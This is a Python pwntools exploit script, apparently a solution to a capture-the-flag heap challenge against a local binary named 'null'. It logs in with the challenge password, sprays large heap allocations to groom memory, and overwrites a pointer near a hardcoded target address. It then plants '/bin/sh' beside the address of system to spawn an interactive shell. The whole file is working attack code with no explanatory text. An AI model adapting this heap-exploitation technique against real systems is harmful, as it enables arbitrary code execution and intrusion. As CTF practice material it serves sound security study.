#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./null"
ENV = {"LD_PRELOAD":"./libc.so.6"}

target_addr = 0x602038
system_addr = 0x400978
bin_sh_addr = 0x602030

password = "i'm ready for challenge\n"

p = process(elf)

def login():
    p.recvuntil("Enter secret password: \n")
    p.send(password)

def use(size, blocks, content, s):
    p.recvuntil("Action: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Pad blocks: ")
    p.sendline(str(blocks))
    p.recvuntil("Content? (0/1): ")
    p.sendline(str(content))
    if content is not 0:
        p.recvuntil("Input: ")
        p.send(s)


login()

for i in range(0x5):
    use(0x3ff0, 0x300, 1, "\x00"*0x3ff0)

#gdb.attach(p)
use(0xff0, 0x3e8, 1, "\x00"*0xff0)
use(0xff0, 0x3, 1, "\x00"*0xff0)

for i in range(0x5):
    use(0x3ff0, 0x300, 1, "\x00"*0x3ff0)

use(0xff0, 0x3e8, 1, "\x00"*0xff0)
use(0xff0, 0x3, 1, "\x00"*0xff0)

for i in range(0x5):
    use(0x3ff0, 0x300, 1, "\x00"*0x3ff0)

use(0xff0, 0x3e6, 1, "\x00"*0xff0)

use(0xfb8, 0x1, 1, "A"*0xfb0)

payload = p8(0)*0x70
payload += p64(target_addr-0x13-0x8)
p.send(payload)

gdb.attach(p)

payload = "/bin/sh\x00"
payload += p8(0)*0x3
payload += p64(system_addr)
payload += p8(0)*(0x60-len(payload))
use(0x60, 0x0, 1, payload)

p.interactive()
